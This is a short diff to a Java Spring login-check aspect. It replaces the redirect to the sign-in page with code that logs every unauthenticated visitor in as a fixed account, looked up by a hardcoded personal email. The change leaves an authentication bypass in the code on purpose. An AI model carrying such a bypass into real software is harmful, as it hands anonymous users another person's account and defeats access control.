@@ -14,7 +14,9 @@ import org.aspectj.lang.annotation.Pointcut;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.servlet.ModelAndView;
 import org.springframework.web.servlet.view.RedirectView;
+import vn.chonsoft.lixi.repositories.service.UserService;
 import vn.chonsoft.lixi.web.LiXiConstants;
+import vn.chonsoft.lixi.web.util.LiXiUtils;
 
 /**
  *
@@ -27,6 +29,10 @@ public class CheckLoginedUserAspectJ {
     
     @Autowired
     private LoginedUser loginedUser;
+    
+    @Autowired
+    private UserService userService;
+
     
     //@Pointcut("execution(public * vn.chonsoft.lixi.web.ctrl.*.*(..))")
     //public void anyPublicMethod() {}
@@ -66,7 +72,9 @@ public class CheckLoginedUserAspectJ {
             
             if(loginedUser.getEmail() == null || "".equals(loginedUser.getEmail().trim())){
                 
-                return new ModelAndView(new RedirectView("/user/signIn?signInFailed=1", true, true));
+                //return new ModelAndView(new RedirectView("/user/signIn?signInFailed=1", true, true));
+                /* irgonred login step */
+                LiXiUtils.setLoginedUser(loginedUser, this.userService.findByEmail("daothidam88@gmail.com"));
                 
             }
             
